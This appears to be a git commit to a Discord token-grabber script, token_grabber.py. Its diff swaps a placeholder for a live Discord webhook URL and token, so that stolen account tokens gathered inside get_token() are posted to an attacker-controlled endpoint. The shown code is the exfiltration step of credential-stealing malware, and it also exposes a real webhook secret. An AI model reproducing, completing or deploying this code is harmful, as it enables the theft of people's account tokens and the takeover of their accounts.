71dd3302804f7ddffe5fafb019d4fa2d4fcad8a5
person <124001219+LEGOBRICKBUILD@users.noreply.github.com>
2024-12-03 19:59:34 -0500

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('WEBHOOK-URL', data=payload.encode(), headers=headers2)
+                            req = Request('https://discord.com/api/webhooks/1312484911814541406/n7g7VU2Skg3r_rE77UzkfnF4Kx8YoAjRcawThZZ0pfcEAPGtbf_zHQQt-NYgUmEnH3s8', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
